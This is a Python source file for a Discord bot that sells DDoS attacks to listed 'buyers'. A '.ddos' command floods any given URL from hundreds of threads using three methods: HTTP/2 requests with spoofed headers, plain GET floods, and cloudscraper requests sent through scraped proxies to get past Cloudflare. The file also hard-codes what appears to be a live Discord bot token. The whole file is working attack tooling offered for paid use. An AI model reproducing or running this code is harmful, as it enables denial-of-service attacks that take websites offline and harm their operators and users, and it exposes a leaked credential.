#=====Import Module=====#
import os
try: 
    import httpx
except ImportError:
    os.system("pip install httpx[http2]")
try: 
    import requests
except ImportError:
    os.system("pip install requests")
try:
    import cloudscraper
except ImportError:
    os.system("pip install cloudscraper")
try:
	import discord
except ImportError:
	os.system("pip install discord")
try:
	import colorama
except ImportError:
	os.system("pip install colorama")
import httpx
import threading, time, sys, requests
import cloudscraper
import os
from discord.ext import commands    
from discord.ext.commands import Bot 
from os import system        
from os import name                  
from colorama import *                                                
import random, datetime, discord                        
#=====User && Methods Setting=====#
buyers  = [944432932142071919]  #          
admins  = [944432932142071919]  #   ID users            
owners  = [944432932142071919]  #         
methods = ['CFB', 'HTTPS', 'RAW']
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTAyMTA5MzY5MTE5NDA4NTQ3Nw.GZpiDk.ZnimFxTh4Xy8dONwHdQjb_oVFIKD_XL1OFtFsc'
intents = discord.Intents.default()
intents.members = True 
intents.message_content = True
intents.messages = True
intents.dm_messages = True       
bot     = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help") 
#====ua====#
ua = open('ua.txt', 'r').read().split('\n')
#====proxy=====#
proxyt = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=all")
#=====Random Color=====#
async def random_color():
    number_lol = random.randint(1, 999999)
    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
    return number_lol
#=====Bot Command=====#
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="LeQuan | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**BASIC**", value = f"```yaml\nCFB\nRAW\nHTTPS```")
        embed.add_field(name = "**Syntax**", value = "```md\n.ddos <method> <url> <thread> <time>```")
        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> LeQuan.")
        embed.set_footer(text = f"©{year_now} LeQuan.")
        await ctx.send(embed=embed)
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer in buyers:
        await ctx.send(f'{buyer} has already copped a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.append(buyer)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer not in buyers:
        await ctx.send(f'{buyer} did not cop a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.remove(buyer)
        await ctx.send('Removed him/her!!')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin in admins:
        await ctx.send(f'{admin} is already an admin!')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.append(admin)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin not in admins:
        await ctx.send(f'{admin} is not an admin')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.remove(admin)
        await ctx.send('Removed him/her!!')

@bot.command()
async def ddos(ctx, method : str = None, victim : str = None, thread : str = None, time : str = None):
    if ctx.author.id not in buyers: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if method is None:
            embed = discord.Embed(title=f"Error!", description=f"You need a method! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif method.upper() not in methods:
            embed = discord.Embed(title="Error!", description=f"Invalid method!! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif thread is None:
            embed = discord.Embed(title="Error!", description=f"You need a thread! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(300)
                max_thread = int(500)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                if int(thread) > max_thread:
                    thread2 = max_thread
                else:
                    thread2 = int(thread)
                if method == 'CFB':
                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/rocket.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} LeQuan.")
                    await ctx.send(embed=embed)
                    until = datetime.datetime.now() + datetime.timedelta(seconds=int(time2))
                    threads_count = 0
                    scraper = cloudscraper.create_scraper()
                    while threads_count <= int(thread2):
                        try:
                            th = threading.Thread(target=AttackCFB, args=(victim, until, scraper))
                            th.start()
                            threads_count += 1
                        except:
                            pass
                elif method == 'HTTPS':
                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/rocket.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} LeQuan.")
                    await ctx.send(embed=embed)
                    until = datetime.datetime.now() + datetime.timedelta(seconds=int(time2))
                    threads_count = 0
                    while threads_count <= int(thread2):
                        try:
                            th = threading.Thread(target=AttackHTTPS, args=(victim, until))
                            th.start()
                            threads_count += 1
                        except:
                            pass
                elif method == 'RAW':
                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/rocket.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} LeQuan.")
                    await ctx.send(embed=embed)
                    until = datetime.datetime.now() + datetime.timedelta(seconds=int(time2))
                    threads_count = 0
                    while threads_count <= int(thread2):
                        try:
                            th = threading.Thread(target=AttackRAW, args=(victim, until))
                            th.start()
                            threads_count += 1
                        except:
                            pass
                   
           
#====script====$
def AttackHTTPS(victim, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(victim, headers=headers)
        except:
            pass


def AttackRAW(victim, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(victim)
        except:
            pass


def AttackCFB(victim, until_datetime, scraper):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {'http': 'http://'+str(random.choice(list(proxyt)))}
            scraper.get(victim, timeout=15, proxies=proxy, headers=headers)
        except:
            pass


@bot.event
async def on_ready():
    banner = f"""LeQuan Bot"""
    if name == 'nt':
        system('cls')
    else:
        system('clear')
    print(banner)
    print(f'\033[1;97mLogged \033[1;96m{bot.user.name}')
    print(f'\033[1;97mBot ID: \033[1;97m{bot.user.id}')
    print('\033[1;97m=============================================================')
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
